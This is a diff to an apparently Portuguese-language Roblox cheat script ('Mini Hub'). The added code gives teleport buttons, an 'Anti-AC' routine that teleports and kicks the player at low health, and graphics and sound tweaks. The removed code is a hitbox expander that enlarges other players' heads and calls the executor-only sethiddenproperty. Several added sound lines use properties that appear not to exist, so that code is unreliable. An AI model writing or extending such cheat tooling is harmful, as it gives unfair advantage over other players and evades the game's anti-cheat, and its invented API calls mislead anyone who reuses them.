+    local diedConn = nil
+
+    local function checkHealth(health)
+        if health <= 10 and health > 0 then -- Vida baixa mas não morto ainda
+            print("Vida baixa detectada ("..health.."), teleportando e preparando para kick...")
+
+            -- Desconecta para evitar múltiplos kicks
+            if healthChangedConn then healthChangedConn:Disconnect(); healthChangedConn = nil end
+            if diedConn then diedConn:Disconnect(); diedConn = nil end
+
+            -- Teleporta para um local seguro (Ex: Tabacaria)
+            local tpTarget = CFrame.new(-83.1141129, 13.1430578, 74.7073364)
+            if character and character:FindFirstChild("HumanoidRootPart") then
+                 character.HumanoidRootPart.CFrame = tpTarget
+                 character.HumanoidRootPart.Anchored = true -- Tenta ancorar brevemente
+                 task.wait(0.1)
+                 character.HumanoidRootPart.Anchored = false
+            end
+
+            -- Espera um pouco e kicka
+            task.wait(1.5) -- Reduzido para 1.5s
+            Rayfield:Notify({ Title = "Anti-AC", Content = "Vida baixa, kickando...", Duration = 5 })
+            task.wait(0.5)
+            Player:Kick("Anti AC [Vida Baixa Detectada] (CL)")
+        end
+    end
+
+     healthChangedConn = humanoid.HealthChanged:Connect(checkHealth)
+     diedConn = humanoid.Died:Connect(function()
+        -- Desconecta os listeners se o jogador morrer normalmente
+        if healthChangedConn then healthChangedConn:Disconnect(); healthChangedConn = nil end
+        if diedConn then diedConn:Disconnect(); diedConn = nil end
+        print("Jogador morreu, Anti-AC desativado para esta vida.")
+     end)
+
+     -- Verifica a vida inicial
+     checkHealth(humanoid.Health)
+end
+
+-- Chama a função para iniciar a verificação
+task.spawn(verificarVidaEKick) -- Usa task.spawn para não bloquear
+
+
+-- ========================================
+--          SEÇÃO TELEPORTES
+-- ========================================
+TeleportTab:CreateParagraph({Title = "Mini Hub", Content = "por th"})
+local TPSection = TeleportTab:CreateSection("TELEPORTS")
+
+-- Função auxiliar para criar botões de teleporte
 local function addTeleportButton(nome, cframe)
-    TeleportTab:CreateButton({
+    TPSection:CreateButton({
         Name = nome,
         Callback = function()
-            local player = game.Players.LocalPlayer
-            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                player.Character:MoveTo(cframe.Position + Vector3.new(0, 3, 0))
+            local character = Player.Character
+            local hrp = character and character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                hrp.CFrame = cframe + Vector3.new(0, 3, 0) -- Adiciona um offset Y para evitar ficar preso no chão
+                print("Teleportado para:", nome)
+            else
+                warn("Não foi possível teleportar, HumanoidRootPart não encontrado.")
+                Rayfield:Notify({ Title = "Erro Teleporte", Content = "Personagem não encontrado ou inválido.", Duration = 4 })
             end
         end
     })
 end
 
--- Locais fixos
-addTeleportButton("Teleport Praça", CFrame.new(-291.579559, 3.26299787, 342.192535))
-addTeleportButton("Teleport Gás", CFrame.new(-469.959015, 3.25349784, -54.3936005))
-addTeleportButton("Teletransportar HP", CFrame.new(-543.439941, 3.26299858, 645.16864))
-addTeleportButton("Teleport Tabacaria", CFrame.new(-83.1141129, 13.1430578, 74.7073364))
-addTeleportButton("Teleport Garagem", CFrame.new(-466.870148, 7.64567232, 350.242737))
-addTeleportButton("Teleport Concessionária", CFrame.new(-91.3902893, 8.07136822, 520.355347))
-addTeleportButton("Teletransportar Gari", CFrame.new(-518.672852, 3.16749811, -1.16962147))
-addTeleportButton("Teleport Imobiliária", CFrame.new(-284.904785, 8.26088619, -72.2896194))
-addTeleportButton("Teletransportar PM", CFrame.new(-980.181458, 2.27553082, 467.080536))
-addTeleportButton("Teletransporte PRF", CFrame.new(6662.24512, 36.6637421, 5047.83838))
-addTeleportButton("Teleport Mineração", CFrame.new(201.932144, 2.76136589, 145.50531))
-addTeleportButton("Teleport Mecânica", CFrame.new(-180.608261, 3.29813337, -532.4151))
-addTeleportButton("Teleport Fazenda", CFrame.new(817.243225, 3.26249814, -87.316864))
-addTeleportButton("Teleport Prefeitura", CFrame.new(-284.388458, 15.1148872, 88.0397873))
-addTeleportButton("Teleport Banco", CFrame.new(-27.2709007, 11.5685892, 418.200653))
-addTeleportButton("Teletransporte ilegal", CFrame.new(12037.2705, 27.5305443, 12794.0635))
-addTeleportButton("Teleportar Prédio 1", CFrame.new(-1595.23328, 204.074341, 555.895386))
-addTeleportButton("Teletransporte Devs Mini",CFrame.new(-291.579559, 3.26299787, 342.192535))
+-- Adiciona os botões de teleporte com as coordenadas fornecidas
+addTeleportButton("Praça", CFrame.new(-291.579559, 3.26299787, 342.192535))
+addTeleportButton("Posto Gás", CFrame.new(-469.959015, 3.25349784, -54.3936005))
+addTeleportButton("Hospital", CFrame.new(-543.439941, 3.26299858, 645.16864))
+addTeleportButton("Tabacaria", CFrame.new(-83.1141129, 13.1430578, 74.7073364))
+addTeleportButton("Garagem", CFrame.new(-466.870148, 7.64567232, 350.242737))
+addTeleportButton("Concessionária", CFrame.new(-91.3902893, 8.07136822, 520.355347))
+addTeleportButton("Gari", CFrame.new(-518.672852, 3.16749811, -1.16962147))
+addTeleportButton("Imobiliária", CFrame.new(-284.904785, 8.26088619, -72.2896194))
+addTeleportButton("PM (DP)", CFrame.new(-980.181458, 2.27553082, 467.080536))
+addTeleportButton("PRF (Base)", CFrame.new(6662.24512, 36.6637421, 5047.83838))
+addTeleportButton("Mineração", CFrame.new(201.932144, 2.76136589, 145.50531))
+addTeleportButton("Mecânica", CFrame.new(-180.608261, 3.29813337, -532.4151))
+addTeleportButton("Fazenda", CFrame.new(817.243225, 3.26249814, -87.316864))
+addTeleportButton("Prefeitura", CFrame.new(-284.388458, 15.1148872, 88.0397873))
+addTeleportButton("Banco", CFrame.new(-27.2709007, 11.5685892, 418.200653))
+addTeleportButton("Local Ilegal", CFrame.new(12037.2705, 27.5305443, 12794.0635))
+addTeleportButton("Topo Prédio 1", CFrame.new(-1595.23328, 204.074341, 555.895386))
+addTeleportButton("Base Devs Mini",CFrame.new(-291.579559, 3.26299787, 342.192535)) -- Mesmo da praça?
 
-
--- Seção Hitbox
-local HitboxSection = Tab:CreateSection("Hitbox (PC e Mobile)") -- Use Tab instead of MainTab
-
-local hitboxEnabled = false
-local originalSizes = {}
-
-local function setHitbox(targetPlayer, size)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
-        local head = targetPlayer.Character.Head
-        if not originalSizes[targetPlayer] then
-            originalSizes[targetPlayer] = head.Size
-        end
-        head.Size = size
-        head.Transparency = 0.7
-        head.Material = Enum.Material.Neon
-        head.Color = Color3.fromRGB(255, 0, 0)
-        head.CanCollide = false
-    end
-end
-
-local function resetHitbox(targetPlayer)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") and originalSizes[targetPlayer] then
-        local head = targetPlayer.Character.Head
-        head.Size = originalSizes[targetPlayer]
-        head.Transparency = 0
-        head.Material = Enum.Material.Plastic
-        head.Color = Color3.fromRGB(255, 255, 255)
-        head.CanCollide = true
-    end
-end
-
-local hitboxConnection
-
-local function toggleHitbox(enabled)
-    hitboxEnabled = enabled
-    if enabled then
-        hitboxConnection = game:GetService("RunService").RenderStepped:Connect(function()
-            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
-                if player ~= Player then
-                    setHitbox(player, Vector3.new(5, 5, 5)) -- Tamanho expandido da Head
-                end
-            end
-        end)
-    else
-        if hitboxConnection then
-            hitboxConnection:Disconnect()
-            hitboxConnection = nil
-        end
-        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
-            if player ~= Player then
-                resetHitbox(player)
-            end
-        end
-        originalSizes = {}
-    end
-end
-
-Tab:CreateToggle({
-    Name = "Hitbox Expander",
-    Description = "Aumenta o tamanho da cabeça dos outros jogadores.",
-    CurrentValue = false,
-    Section = HitboxSection,
-    Callback = function(Value)
-        toggleHitbox(Value)
-    end
-})
-
--- CONFIG TAB
-local ConfigSection = ConfigTab:CreateSection("Ajustes e Preferências")
+-- ========================================
+--          SEÇÃO CONFIGURAÇÕES
+-- ========================================
+local ConfigSection = ConfigTab:CreateSection("Ajustes e Otimizações")
 
 -- Variável para controle do som
 local soundMuted = false
 
--- Botões de Configurações para PC e Mobile
-
-ConfigTab:CreateButton({
-    Name = "Ativar Modo de Desempenho (FPS Boost Melhorado)",
+-- Botão FPS Boost Melhorado
+ConfigSection:CreateButton({
+    Name = "Ativar FPS Boost Extremo",
     Callback = function()
-        for i,v in pairs(game:GetDescendants()) do
-            if v:IsA("BasePart") then
-                v.Material = Enum.Material.Plastic
-                v.Reflectance = 0
-                v.CastShadow = false
-            elseif v:IsA("Decal") or v:IsA("Texture") then
-                v.Transparency = 0.5
-            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-                v.Enabled = false
-            elseif v:IsA("Smoke") or v:IsA("Fire") then
-                v.Enabled = false
-            end
+        local decalsEnabled = false -- Opção para manter decals visíveis
+        local texturesEnabled = false -- Opção para manter texturas visíveis
+
+        for _, v in pairs(workspace:GetDescendants()) do
+            pcall(function()
+                if v:IsA("BasePart") then
+                    v.Material = Enum.Material.Plastic
+                    v.Reflectance = 0
+                    v.CastShadow = false
+                    if not texturesEnabled then
+                         if v:IsA("Texture") then v.Transparency = 1 end
+                         if v:FindFirstChildOfClass("Texture") then v:FindFirstChildOfClass("Texture").Transparency = 1 end
+                    end
+                     if not decalsEnabled then
+                         if v:IsA("Decal") then v.Transparency = 1 end
+                         if v:FindFirstChildOfClass("Decal") then v:FindFirstChildOfClass("Decal").Transparency = 1 end
+                     end
+                elseif v:IsA("Decal") and not decalsEnabled then
+                    v.Transparency = 1
+                elseif v:IsA("Texture") and not texturesEnabled then
+                     v.Transparency = 1
+                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") or v:IsA("Sparkles") then
+                    v.Enabled = false
+                elseif v:IsA("Explosion") then
+                     v.BlastPressure = 0
+                     v.BlastRadius = 0
+                elseif v:IsA("PostEffect") then -- Remove efeitos de pós-processamento
+                     v.Enabled = false
+                elseif v:IsA("MeshPart") then -- Simplifica malhas se possível (reduz qualidade visual)
+                     v.RenderFidelity = Enum.RenderFidelity.Performance
+                     v.Material = Enum.Material.Plastic
+                     v.Reflectance = 0
+                elseif v:IsA("TrussPart") or v:IsA("VehicleSeat") or v:IsA("SkateboardPlatform") then -- Simplifica partes específicas
+                     v.Material = Enum.Material.Plastic
+                     v.Reflectance = 0
+                 end
+            end)
         end
-        -- Deixar a iluminação normal, sem névoa
-        local Lighting = game:GetService("Lighting")
-        Lighting.FogEnd = 100000
-        Lighting.FogStart = 100000
-        Lighting.Brightness = 2
+
+        -- Otimizações de Iluminação
+         Lighting.Ambient = Color3.fromRGB(128, 128, 128)
+         Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+        Lighting.Brightness = 0.5
         Lighting.GlobalShadows = false
-        sethiddenproperty(Lighting, "Technology", Enum.Technology.Compatibility)
+        Lighting.FogEnd = 100000
+        Lighting.FogStart = 99999
+         pcall(function() Lighting.Technology = Enum.Technology.Compatibility end) -- Melhor compatibilidade/performance
+         pcall(function() Lighting.ShadowSoftness = 0 end)
+         for _, effect in pairs(Lighting:GetChildren()) do
+             if effect:IsA("PostEffect") or effect:IsA("Atmosphere") or effect:IsA("Sky") then
+                 effect.Enabled = false
+             end
+         end
+
+        -- Otimizações de Renderização
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        settings().Rendering.MeshPartDetailLevel = Enum.MeshPartDetailLevel.LevelOfDetail
+        settings().Rendering.EagerBulkExecution = true -- Pode ajudar em alguns casos
+
+        -- Desativa física desnecessária (pode quebrar alguns scripts de jogo)
+        -- workspace.PhysicsSteppingMethod = Enum.PhysicsSteppingMethod.Fixed
+
+        print("FPS Boost Extremo Ativado!")
+        Rayfield:Notify({ Title = "Otimização", Content = "FPS Boost Extremo Ativado.", Duration = 4 })
     end,
 })
 
-ConfigTab:CreateToggle({
-    Name = "Ativar/Desativar Som do Jogo",
-    CurrentValue = false,
+-- Toggle para Silenciar/Ativar Som
+ConfigSection:CreateToggle({
+    Name = "Silenciar Som do Jogo",
+    CurrentValue = soundMuted,
     Callback = function(Value)
         soundMuted = Value
-        for _, s in pairs(game:GetService("SoundService"):GetDescendants()) do
+        SoundService.RespectFilteringEnabled = true -- Necessário para alterar volumes globalmente
+        local targetVolume = soundMuted and 0 or 0.5 -- Define volume como 0 ou 50%
+
+        for _, s in pairs(SoundService:GetDescendants()) do
             if s:IsA("Sound") then
-                s.Volume = soundMuted and 0 or 1
+                s.Volume = targetVolume
             end
         end
+         -- Alterar o volume global pode ser mais eficaz
+         SoundService.MasterVolume = targetVolume -- Tenta alterar o volume mestre (pode não funcionar em todos os contextos)
+         game.SoundService.Volume = targetVolume -- Outra propriedade de volume
+
+        print("Som do jogo", soundMuted and "silenciado." or "ativado (50%).")
+         Rayfield:Notify({ Title = "Som", Content = soundMuted and "Jogo Silenciado." or "Som do Jogo Ativado (50%).", Duration = 3 })
     end,
 })
 
-ConfigTab:CreateButton({
-    Name = "Resetar Personagem",
+-- Botão Resetar Personagem
+ConfigSection:CreateButton({
+    Name = "Resetar Personagem (Forçado)",
     Callback = function()
-        local plr = game.Players.LocalPlayer
-        if plr.Character then
-            plr.Character:BreakJoints()
+        local char = Player.Character
+        if char then
+            char:BreakJoints()
+            task.wait(0.1)
+            -- Tenta forçar a morte se BreakJoints não for suficiente
+            local humanoid = char:FindFirstChildOfClass("Humanoid")
+            if humanoid then humanoid.Health = 0 end
+            print("Personagem resetado.")
+             Rayfield:Notify({ Title = "Reset", Content = "Personagem resetado.", Duration = 3 })
+        else
+            warn("Personagem não encontrado para resetar.")
         end
     end,
 })
 
-ConfigTab:CreateButton({
-    Name = "Desligar Partículas",
+-- Botão Desligar Partículas (redundante com FPS boost, mas pode ser útil separadamente)
+ConfigSection:CreateButton({
+    Name = "Desligar Todas as Partículas",
     Callback = function()
-        for _, obj in pairs(game:GetDescendants()) do
-            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
+        local count = 0
+        for _, obj in pairs(workspace:GetDescendants()) do
+            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") then
                 obj.Enabled = false
+                count = count + 1
             end
         end
+        print(count .. " emissores de partículas/efeitos desativados.")
+        Rayfield:Notify({ Title = "Otimização", Content = count .. " partículas desativadas.", Duration = 4 })
     end,
 })
 
-ConfigTab:CreateButton({
-    Name = "Ativar Gráficos Baixos (Mobile)",
+-- Botões para Qualidade Gráfica (redundante com FPS boost)
+ConfigSection:CreateButton({
+    Name = "Gráficos Baixos (Nível 1)",
     Callback = function()
         settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        print("Qualidade gráfica definida para Nível 1.")
+        Rayfield:Notify({ Title = "Gráficos", Content = "Qualidade definida: Baixa (Nível 1).", Duration = 3 })
     end,
 })
 
-ConfigTab:CreateButton({
-    Name = "Ativar Gráficos Médios (PC)",
+ConfigSection:CreateButton({
+    Name = "Gráficos Médios (Nível 10)", -- Nível 10 é geralmente médio
     Callback = function()
-        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
+        settings().Rendering.QualityLevel = Enum.QualityLevel.Level10
+        print("Qualidade gráfica definida para Nível 10.")
+        Rayfield:Notify({ Title = "Gráficos", Content = "Qualidade definida: Média (Nível 10).", Duration = 3 })
     end,
 })
+
+print("Mini Hub UI Carregada e Funções Prontas.")
